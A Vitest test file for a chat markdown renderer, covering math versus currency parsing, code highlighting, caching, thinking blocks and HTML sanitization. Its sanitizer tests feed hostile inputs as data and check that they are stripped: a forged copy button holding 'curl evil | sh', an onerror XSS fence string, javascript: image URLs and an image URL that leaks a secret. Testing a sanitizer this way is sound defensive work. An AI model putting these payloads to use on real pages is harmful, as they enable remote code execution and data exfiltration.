import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import DOMPurify from 'dompurify';
// The instance the renderer registers its grammars on; importing the full
// 'highlight.js' here would register all 192 onto it.
import hljs from 'highlight.js/lib/core';
import { renderMarkdownSafe, clearMarkdownCache, markdownCacheSize } from '../markdownRenderer';

/** Bypasses the stored result of an earlier test; `cache: false` still reads the cache. */
function renderFresh(content: string, disableMath = false): string {
  clearMarkdownCache();
  return renderMarkdownSafe(content, { disableMath, cache: false });
}

function countKatex(html: string): number {
  return html.match(/class="katex"/g)?.length ?? 0;
}

describe('markdownRenderer', () => {
  describe('code block protection', () => {
    it('should preserve math expressions inside inline code', () => {
      const result = renderMarkdownSafe('Use `$x^2$` for inline math');
      expect(result).toContain('<code>$x^2$</code>');
      expect(result).not.toContain('katex');
    });

    it('should preserve math expressions inside fenced code blocks', () => {
      const result = renderMarkdownSafe('```\n$x^2$\n```');
      expect(result).toContain('$x^2$');
      expect(result).not.toContain('katex');
    });

    it('should render math outside code blocks while preserving code inside', () => {
      const result = renderMarkdownSafe('The formula $x^2$ is shown as `$x^2$`');
      // Math outside code should be rendered
      expect(result).toContain('katex');
      // Code should preserve the original
      expect(result).toContain('<code>$x^2$</code>');
    });

    it('should handle fenced code block with math and text math', () => {
      const input = `Here is inline math: $E=mc^2$

\`\`\`javascript
// Use $x^2$ for squares
const formula = '$y^2$';
\`\`\`

More math: $a+b$`;
      const result = renderMarkdownSafe(input);
      // Inline math should be rendered as KaTeX
      expect(result).toContain('katex');
      // Code block should preserve $
      expect(result).toContain('$x^2$');
      expect(result).toContain('$y^2$');
    });

    it('should not process math inside code with backticks and currency', () => {
      const result = renderMarkdownSafe('Cost is $12.34, `1+1`, and $56.78');
      // Currency should not be math
      expect(result).toContain('$12.34');
      expect(result).toContain('$56.78');
      // Code should be preserved
      expect(result).toContain('<code>1+1</code>');
    });
  });

  describe('math rendering', () => {
    it('should render inline math with $...$', () => {
      const result = renderMarkdownSafe('The formula $x^2$ is important');
      expect(result).toContain('katex');
    });

    it('should render display math with $$...$$', () => {
      const result = renderMarkdownSafe('$$\\int_0^1 x dx$$');
      expect(result).toContain('katex');
      expect(result).toContain('katex-display');
    });

    it('should not render currency as math', () => {
      const result = renderMarkdownSafe('The price is $10.50 to $20.00');
      expect(result).not.toContain('katex');
      expect(result).toContain('$10.50');
      expect(result).toContain('$20.00');
    });

    it('should render valid math next to currency', () => {
      const result = renderMarkdownSafe('$20 for $\\frac{1}{4}$ of pizza');
      // Currency not math
      expect(result).toContain('$20');
      // Fraction is math
      expect(result).toContain('katex');
    });

    it('renders an integer between dollars as math', () => {
      expect(countKatex(renderFresh('Answer: $100$'))).toBe(1);
    });

    it('applies Disable Math inside <thinking>', () => {
      const result = renderFresh('<thinking>\nEnergy $E=mc^2$\n</thinking>', true);
      expect(result).toContain('<thinking>');
      expect(result).toContain('$E=mc^2$');
      expect(result).not.toContain('katex');
    });

    it('still renders math inside <thinking> when math is on', () => {
      expect(renderFresh('<thinking>\nEnergy $E=mc^2$\n</thinking>')).toContain('katex');
    });
  });

  describe('currency false positive prevention', () => {
    it.each([
      ['The price is from $1.5 to $2.25', 0],
      ['It costs $50 dollars', 0],
      ['From $start to $end point', 0],
      ['Price is \\$100 but formula $x^2 + y^2 = r^2$ works', 1],
      ['Price is $100 but formula $x^2 + y^2 = r^2$ works', 1],
      ['The price is $1.5, $(x^2)$', 1],
      ['I paid $20 for $\\frac{1}{4}$ of pizza', 1],
      ['Test $A$B$C$ here', 2],
      ['Invalid: $$\\bad{$$ text', 0],
    ])('%s renders %i math spans', (input, expected) => {
      expect(countKatex(renderFresh(input))).toBe(expected);
    });

    it('keeps the currency text next to math', () => {
      const result = renderFresh('Price is $100 but formula $x^2 + y^2 = r^2$ works');
      expect(result).toContain('$100 but formula');
    });
  });

  describe('code block rendering', () => {
    it('should render code blocks with copy button', () => {
      const result = renderMarkdownSafe('```javascript\nconst x = 1;\n```');
      expect(result).toContain('code-block-container');
      expect(result).toContain('code-copy-button');
      expect(result).toContain('data-code');
    });

    it('should preserve original code in data-code attribute', () => {
      const result = renderMarkdownSafe('```\nconst x = 1;\n```');
      expect(result).toContain('data-code="const x = 1;');
    });

    it('should syntax highlight code blocks', () => {
      const result = renderFresh('```javascript\nconst x = 1;\n```');
      // hljs adds span classes for highlighting
      expect(result).toContain('hljs-');
    });
  });

  describe('language detection policy', () => {
    afterEach(() => {
      vi.restoreAllMocks();
    });

    it('auto-detects small unlabeled fences against the short language list', () => {
      const spy = vi.spyOn(hljs, 'highlightAuto');
      renderFresh('```\nconst x: number = 1;\n```');
      expect(spy).toHaveBeenCalledTimes(1);
      expect(spy.mock.calls[0][1]).toEqual(expect.arrayContaining(['typescript', 'python']));
      expect(spy.mock.calls[0][1]!.length).toBeLessThan(20);
    });

    it('escapes large unlabeled fences without auto-detection', () => {
      const spy = vi.spyOn(hljs, 'highlightAuto');
      const log = 'INFO worker processed item <id> status=ok\n'.repeat(200);
      const result = renderFresh('```\n' + log + '```');
      expect(spy).not.toHaveBeenCalled();
      expect(result).toContain('&lt;id&gt;');
      expect(result).not.toContain('hljs-');
    });

    it('escapes fences with an unknown language tag without auto-detection', () => {
      const spy = vi.spyOn(hljs, 'highlightAuto');
      const result = renderFresh('```log\nfunction <b>x</b>() {}\n```');
      expect(spy).not.toHaveBeenCalled();
      expect(result).toContain('&lt;b&gt;x&lt;/b&gt;');
      expect(result).toContain('code-copy-button');
    });

    it.each([
      ['sh', 'echo "hi" # greet'],
      ['shell', '$ npm install\nadded 1 package'],
      ['console', '$ ls -la'],
      ['html', '<div class="x">hi</div>'],
      ['ts', 'const x: number = 1;'],
      ['tsx', 'const x: number = 1;'],
      ['toml', '[server]\nport = 8080'],
      ['yml', 'key: value'],
      ['py', 'def f():\n    return 1'],
      ['dockerfile', 'FROM node:20\nRUN npm ci'],
      ['kt', 'fun main() {}'],
      ['cs', 'public class A {}'],
    ])('highlights the %s label from the curated grammar list', (label, code) => {
      const result = renderFresh('```' + label + '\n' + code + '\n```');
      expect(result).toContain('hljs-');
    });

    it('escapes a label whose grammar is only in the full highlight.js build', () => {
      expect(hljs.getLanguage('clojure')).toBeUndefined();
      const result = renderFresh('```clojure\n(defn <b>x</b> [] 1)\n```');
      expect(result).toContain('&lt;b&gt;x&lt;/b&gt;');
      expect(result).not.toContain('hljs-');
    });
  });

  describe('render cache', () => {
    beforeEach(() => {
      clearMarkdownCache();
    });

    afterEach(() => {
      vi.restoreAllMocks();
    });

    it('returns the cached HTML for repeated input without re-sanitizing', () => {
      const spy = vi.spyOn(DOMPurify, 'sanitize');
      const input = '# Title\n\n```ts\nconst x = 1;\n```';
      const first = renderMarkdownSafe(input);
      const second = renderMarkdownSafe(input);
      expect(second).toBe(first);
      expect(spy).toHaveBeenCalledTimes(1);
      expect(second).toContain('code-copy-button');
    });

    it('keys the cache on the disableMath option', () => {
      const withMath = renderMarkdownSafe('Energy $E=mc^2$');
      const withoutMath = renderMarkdownSafe('Energy $E=mc^2$', { disableMath: true });
      expect(withMath).toContain('katex');
      expect(withoutMath).not.toContain('katex');
    });

    it('evicts the least recently used entries past the entry cap', () => {
      const spy = vi.spyOn(DOMPurify, 'sanitize');
      renderMarkdownSafe('first');
      for (let i = 0; i < 250; i++) renderMarkdownSafe(`filler ${i}`);
      spy.mockClear();
      renderMarkdownSafe('first');
      expect(spy).toHaveBeenCalledTimes(1);
    });

    it('cache: false renders without storing, but still reads a cached render', () => {
      const spy = vi.spyOn(DOMPurify, 'sanitize');
      renderMarkdownSafe('partial reply', { cache: false });
      expect(markdownCacheSize()).toBe(0);

      renderMarkdownSafe('finished reply');
      spy.mockClear();
      renderMarkdownSafe('finished reply', { cache: false });
      expect(spy).not.toHaveBeenCalled();
    });
  });

  describe('thinking block rendering', () => {
    it('should preserve thinking tags with closing tag intact', () => {
      const input = '<thinking>\nSome internal reasoning\n</thinking>\n\nRegular text here';
      const result = renderMarkdownSafe(input);
      // Thinking tag should be present with proper structure
      expect(result).toContain('<thinking>');
      expect(result).toContain('</thinking>');
      // Regular text should be outside thinking block
      expect(result).toContain('Regular text here');
    });

    it('should render markdown inside thinking blocks', () => {
      const input = '<thinking>\n**bold** and *italic*\n</thinking>';
      const result = renderMarkdownSafe(input);
      expect(result).toContain('<thinking>');
      expect(result).toContain('<strong>bold</strong>');
      expect(result).toContain('<em>italic</em>');
      expect(result).toContain('</thinking>');
    });

    it('should handle thinking block with complex content', () => {
      const input = `<thinking>
1. First item
2. Second item
- Bullet point
</thinking>

**Visible response** follows.`;
      const result = renderMarkdownSafe(input);
      // Thinking block with lists
      expect(result).toContain('<thinking>');
      expect(result).toContain('</thinking>');
      // Regular bold text outside
      expect(result).toContain('<strong>Visible response</strong>');
    });

    it('should not extend thinking tag to content after closing tag', () => {
      const input = '<thinking>Internal</thinking>External content';
      const result = renderMarkdownSafe(input);
      // Parse the result - thinking should only contain "Internal"
      expect(result).toMatch(/<thinking>[\s\S]*Internal[\s\S]*<\/thinking>/);
      // External content should be outside the thinking tag
      expect(result).toContain('External content');
      // Verify external content is not inside thinking tag
      expect(result).not.toMatch(/<thinking>[\s\S]*External content[\s\S]*<\/thinking>/);
    });
  });

  describe('edge cases', () => {
    it('should handle multiple code blocks with math between them', () => {
      const input = '`code1` then $x^2$ then `code2`';
      const result = renderMarkdownSafe(input);
      expect(result).toContain('<code>code1</code>');
      expect(result).toContain('<code>code2</code>');
      expect(result).toContain('katex');
    });

    it('should handle display math between code blocks', () => {
      const input = '```\na\n```\n\n$$x^2$$\n\n```\nb\n```';
      const result = renderMarkdownSafe(input);
      expect(result).toContain('katex-display');
      // Both code blocks should be present
      expect(result.match(/code-block-container/g)?.length).toBe(2);
    });

    it('should handle nested backticks in code', () => {
      const result = renderMarkdownSafe('`` `code` ``');
      expect(result).toContain('<code>');
    });

    it('should escape HTML in code blocks', () => {
      const result = renderMarkdownSafe('`<script>alert(1)</script>`');
      expect(result).not.toContain('<script>');
    });

    it('should handle triple dollar signs ($$$) without false matches', () => {
      const result = renderMarkdownSafe('That costs $$$ is slang for money');
      // Should NOT render as math - no valid math here
      expect(result).not.toContain('katex');
      // The dollar signs may be reformatted by markdown but should not be math
      expect(result).toContain('$');
    });

    it('should handle four or more dollar signs ($$$$) without false matches', () => {
      const result = renderMarkdownSafe('Super expensive $$$$ right?');
      // Should NOT render as math
      expect(result).not.toContain('katex');
      expect(result).toContain('$');
    });

    it('should handle many consecutive dollar signs ($$$$$)', () => {
      const result = renderMarkdownSafe('$$$$$ is a lot of money');
      expect(result).not.toContain('katex');
      expect(result).toContain('$');
    });

    it('should handle the confusing phrase with em-dash and dollar signs', () => {
      const input =
        'The phrase "That costs $$$" is confusing—it\'s "$$$" literally, versus $\\$\\$\\$$ in math mode.';
      const result = renderMarkdownSafe(input);
      // The "$$$" should remain as literal text (not extracted as math)
      expect(result).toContain('$$$');
      // The $\$\$\$$ should be rendered as math (three dollar signs)
      expect(result).toContain('katex');
      // The text "is confusing" should be plain text (not inside katex span)
      expect(result).toContain('is confusing');
      // Verify "is confusing" is NOT inside a katex span (it should be plain paragraph text)
      expect(result).not.toMatch(/<span class="katex[^"]*">[^<]*is confusing/);
    });

    it('should NOT capture text between two $$$ patterns as math', () => {
      // This is the exact failing case - text between $$$ and $$$ should not be math
      const input = '"That costs $$$" is confusing—it\'s "$$$" literally';
      const result = renderMarkdownSafe(input);
      // No math should be extracted - both $$$ are literal text
      expect(result).not.toContain('katex');
      // The phrase should be preserved
      expect(result).toContain('is confusing');
      expect(result).toContain("it's");
    });

    it('should render single character $x$ as math', () => {
      const result = renderMarkdownSafe('Let $x$ be a variable');
      expect(result).toContain('katex');
    });

    it('should handle text with hyphens but no math', () => {
      const result = renderMarkdownSafe('This is a well-known fact and x-y coordinate');
      // No math should be extracted
      expect(result).not.toContain('katex');
    });

    it('should handle math with proper minus signs', () => {
      const result = renderMarkdownSafe('The formula $a - b$ uses subtraction');
      expect(result).toContain('katex');
    });

    it('should handle negative numbers in math', () => {
      const result = renderMarkdownSafe('Value is $-5$ or $-.5$');
      expect(result).toContain('katex');
    });

    it('should not interpret $ in citation link title as math delimiter', () => {
      // Citation links with HTML-escaped $ (&#36;) prevent math parsing interference
      // The &#36; is decoded by DOMPurify to $ for display, but the escaping
      // prevents markdown's math extension from matching it during parsing
      const input =
        'Ottawa is the capital<a href="https://example.com" title="Price is &#36;10" class="citation-link">src</a> of Canada and costs $x^2$ to visit';
      const result = renderMarkdownSafe(input);
      // The real math $x^2$ should be rendered
      expect(result).toContain('katex');
      // The citation link should be preserved (DOMPurify decodes &#36; to $)
      expect(result).toContain('citation-link');
      expect(result).toContain('title="Price is $10"');
    });

    it('should preserve markdown chars escaped as HTML entities in citation links', () => {
      // Citation links with HTML-escaped markdown chars prevent markdown parsing
      // DOMPurify decodes them to display characters
      const input =
        'Text<a href="https://example.com" title="&#42;bold&#42; and &#95;italic&#95;" class="citation-link">src</a> more text';
      const result = renderMarkdownSafe(input);
      // The citation link should be preserved (DOMPurify decodes entities)
      expect(result).toContain('citation-link');
      expect(result).toContain('title="*bold* and _italic_"');
    });
  });

  describe('sanitizer', () => {
    it('strips <style> elements and style attributes from model HTML', () => {
      const result = renderFresh('<p style="color:red">x</p><style>*{display:none}</style>');
      expect(result).not.toContain('<style');
      expect(result).not.toContain('style=');
      expect(result).toContain('<p>x</p>');
    });

    it('drops app classes, keeping only citation-link', () => {
      const result = renderFresh('<div class="fixed inset-0 z-50">overlay</div>');
      expect(result).toBe('<div>overlay</div>');
    });

    it('drops a forged copy button and its data-code', () => {
      const result = renderFresh(
        '<span class="code-copy-button" data-code="curl evil | sh">📋</span>'
      );
      expect(result).not.toContain('code-copy-button');
      expect(result).not.toContain('data-code');
    });

    it('strips form controls', () => {
      const result = renderFresh(
        '<form action="https://x.example"><input name="a"><textarea>t</textarea>' +
          '<select><option>o</option></select><button>go</button></form>'
      );
      expect(result).not.toMatch(/<(form|input|textarea|select|option|button)\b/);
    });

    it('strips elements and attributes that fetch remote resources', () => {
      const result = renderFresh(
        '<svg><image href="https://x.example/a"></image></svg>' +
          '<table background="https://x.example/b"><tr><td>t</td></tr></table>' +
          '<video poster="https://x.example/c" src="https://x.example/d"></video>' +
          '<audio src="https://x.example/e"></audio>' +
          '<img src="data:image/png;base64,AAAA" srcset="https://x.example/f 2x">'
      );
      expect(result).not.toContain('x.example');
      expect(result).not.toMatch(/<(svg|image|video|audio)\b/);
    });

    it('keeps citation links with their attributes and opens them in a new tab', () => {
      const result = renderFresh(
        'Fact<a href="https://example.com" title="Source" data-cited="quoted" class="citation-link">src</a>'
      );
      expect(result).toContain('class="citation-link"');
      expect(result).toContain('data-cited="quoted"');
      expect(result).toContain('title="Source"');
      expect(result).toContain('target="_blank"');
      expect(result).toContain('rel="noopener noreferrer"');
    });

    it('opens markdown links in a new tab', () => {
      expect(renderFresh('[docs](https://example.com)')).toBe(
        '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer">docs</a></p>\n'
      );
    });

    it('keeps the inline styles KaTeX needs', () => {
      expect(renderFresh('$x^2$')).toMatch(/<span class="katex">[\s\S]*style="/);
    });

    it('renders GFM task items as disabled checkboxes', () => {
      const result = renderFresh('- [x] done\n- [ ] todo');
      expect(result).toContain('<input type="checkbox" disabled checked>');
      expect(result).toContain('<input type="checkbox" disabled>');
    });

    it('escapes code in the copy button data-code attribute', () => {
      const result = renderFresh('```\na "quoted" <b>&</b>\n```');
      expect(result).toContain('data-code="a &quot;quoted&quot; &lt;b&gt;&amp;&lt;/b&gt;"');
    });

    it('renders replacement patterns in code verbatim', () => {
      const result = renderFresh("```text\necho $& $` $' $$\n```");
      expect(result).toContain('echo $&amp; $` $&#039; $$');
    });

    it('keeps a hostile fence info string inert', () => {
      const result = renderFresh('```x"><img src=x onerror=alert(1)>\ncode\n```');
      expect(result).not.toContain('<img');
      expect(result).toContain('class="language-x&quot;&gt;&lt;img"');
    });

    it('does not fill a forged slot placeholder', () => {
      const result = renderFresh('$x^2$ <span data-md-slot="x-0">forged</span>');
      expect(result).toContain('<span>forged</span>');
      expect(countKatex(result)).toBe(1);
    });
  });

  describe('image policy', () => {
    it('turns a remote image into a link instead of loading it', () => {
      const result = renderFresh('![secret chart](https://x.example/?d=SECRET)');
      expect(result).not.toContain('<img');
      expect(result).toContain(
        '<a href="https://x.example/?d=SECRET" target="_blank" rel="noopener noreferrer">🖼 secret chart (x.example)</a>'
      );
    });

    it('handles raw <img> HTML the same way', () => {
      const result = renderFresh('<img src="https://x.example/p.png">');
      expect(result).not.toContain('<img');
      expect(result).toContain('href="https://x.example/p.png"');
      expect(result).toContain('🖼 image (x.example)');
    });

    it('keeps the outer link of a linked image without nesting anchors', () => {
      const result = renderFresh('[![build](https://x.example/b.svg)](https://y.example)');
      expect(result).not.toContain('<img');
      expect(result.match(/<a /g)).toHaveLength(1);
      expect(result).toContain('href="https://y.example"');
      expect(result).toContain('<span>🖼 build (x.example)</span>');
    });

    it('keeps inline data:image images', () => {
      expect(renderFresh('![dot](data:image/png;base64,AAAA)')).toContain(
        '<img src="data:image/png;base64,AAAA" alt="dot">'
      );
    });

    it('leaves only the label when the src was unsafe', () => {
      const result = renderFresh('<img src="javascript:alert(1)" alt="x">');
      expect(result).not.toContain('<img');
      expect(result).not.toContain('javascript');
      expect(result).toContain('🖼 x');
    });
  });
});
